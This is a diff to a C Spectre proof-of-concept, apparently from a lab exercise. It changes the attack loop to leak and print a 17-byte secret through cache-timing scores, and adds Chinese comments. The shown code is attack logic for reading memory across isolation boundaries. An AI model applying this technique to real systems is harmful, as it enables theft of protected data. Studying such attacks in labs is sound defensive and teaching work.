@@ -73,10 +73,7 @@ void spectreAttack(size_t index_beyond)
   //
   // Ask victim() to return the secret in out-of-order execution.
   s = restrictedAccess(index_beyond);
-  if (s != 0) {
-    array[s*4096 + DELTA] += 88;
-  }
-  
+  if (s) array[s*4096 + DELTA] += 88;
 }
 
 int main() {
@@ -84,12 +81,13 @@ int main() {
   uint8_t s;
   size_t index_beyond = (size_t)(secret - (char*)buffer);
 
-  
-  
+  //循环进行17次攻击，记录每次攻击得到的结果
   int res[20] = {0};
   for (int j = 0; j < 17; ++j) {
+    //清除缓存并初始化分数
     flushSideChannel();
     for(i=0;i<256; i++) scores[i]=0; 
+
     for (i = 0; i < 1000; i++) {
       printf("*****\n");  // This seemly "useless" line is necessary for the attack to succeed
       spectreAttack(index_beyond + j);
@@ -98,15 +96,19 @@ int main() {
     }
     int max = 0;
     for (i = 0; i < 256; i++){
-      if(scores[max] < scores[i]) max = i;
+      if(scores[max] < scores[i]) {
+        max = i;
+        res[j] = max;
+      }
     }
-    res[j] = max;
   }
 
+
   printf("Reading secret value at index %ld\n", index_beyond);
-  // printf("The secret value is %d(%c)\n", max, max);
   printf("The secret value is ");
-  for (int i = 0; i < 17; ++i) printf("%c", res[i]);
+  for (int i = 0; i < 17; ++i) {
+    printf("%c", res[i]);
+  }
   printf("\n");
   // printf("The number of hits is %d\n", scores[max]);
   return (0); 
